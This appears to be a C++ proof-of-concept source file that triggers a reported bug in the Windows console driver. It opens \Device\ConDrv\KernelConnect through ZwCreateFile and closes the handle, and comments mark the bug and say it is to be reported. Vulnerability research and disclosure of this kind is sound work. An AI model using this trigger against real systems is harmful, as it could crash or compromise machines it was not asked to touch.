// ConDrv_KernelConnect.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#define ulong unsigned long
#define ulonglong unsigned long long
#define longlong long long
#define ULONG unsigned long
#define ULONGLONG unsigned long long
#define ushort unsigned short
#define USHORT unsigned short
#define uchar unsigned char

#define OBJ_CASE_INSENSITIVE 0x40
#define FILE_OPEN 0x1
#define FILE_NON_DIRECTORY_FILE   0x00000040






typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaxLength;
	unsigned long Pad;
	wchar_t* Buffer;
}UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONGLONG           Length;
  HANDLE          RootDirectory;
  _UNICODE_STRING* ObjectName;
  ULONGLONG           Attributes;
  PVOID           SecurityDescriptor;
  PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
  union {
    int Status;
    void*    Pointer;
  } DUMMYUNIONNAME;
  ulonglong Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;



extern "C"
{
		int ZwCreateFile(HANDLE* pFileHandle,
					ulong DesiredAccess, 
					_OBJECT_ATTRIBUTES* ObjectAttributes, 
					void* IoStatusBlock, 
					_LARGE_INTEGER* AllocationSize, 
					ulonglong FileAttributes,
					ulonglong ShareAccess, 
					ulonglong CreateDisposition, 
					ulonglong CreateOptions, 
					void* EaBuffer, 
					ulonglong EaLength);
}

int OpenDevice(wchar_t* DeviceName,HANDLE* phDevice)
{
	if(!DeviceName) return -1;
	if(!phDevice) return -2;

	*phDevice = INVALID_HANDLE_VALUE;

	HANDLE hFile = 0;
	_UNICODE_STRING Uni  = {0};
	Uni.Buffer = DeviceName; 
	Uni.Length = wcslen(DeviceName) * 2;
	Uni.MaxLength = Uni.Length + 2;


	_OBJECT_ATTRIBUTES Obj = {0};
	Obj.Length = sizeof(Obj);
	Obj.ObjectName = &Uni;
	Obj.Attributes = OBJ_CASE_INSENSITIVE;

	_IO_STATUS_BLOCK IOB = {0};




	int ret = ZwCreateFile(&hFile,
						FILE_GENERIC_READ|FILE_GENERIC_WRITE /*0xC0100080*/,
						&Obj,
						&IOB,
						0 /*AllocationSize*/,
						FILE_ATTRIBUTE_NORMAL /*FileAttributes*/,
						FILE_SHARE_READ|FILE_SHARE_WRITE,
						FILE_OPEN  /*CreateDisposition*/,
						FILE_NON_DIRECTORY_FILE /*CreateOptions*/,
						0 /*EaBuffer*/,
						0 /*EaLength*/);
	if(hFile && hFile!=INVALID_HANDLE_VALUE)
	{
		*phDevice = hFile;
	}
	return ret;
}


//To Be reported, Susysem CUI
int POC_0()
{
	#define MAX_EXTS 12

	HANDLE hDev[MAX_EXTS] = {0};

	wchar_t* Exttttttttt = L"\\KernelConnect";
	wchar_t* pDevName = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH*2) + 2);
		
	HANDLE hDevXX = 0;
	if(pDevName)
	{
		wcscpy(pDevName,L"\\Device\\ConDrv");
		wcscat(pDevName,Exttttttttt);
		wprintf(L"Opening: %s\r\n",pDevName);



		int ret = OpenDevice(pDevName,&hDevXX);
		if(	(ret < 0) || (hDevXX == INVALID_HANDLE_VALUE ) )
		{
			printf("Can't open device, Error: %X\r\n",ret);
		}
		else
		{
			CloseHandle(hDevXX);//Bug here
		}
		LocalFree(pDevName);

		
	}
	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	POC_0();
	return 0;
}

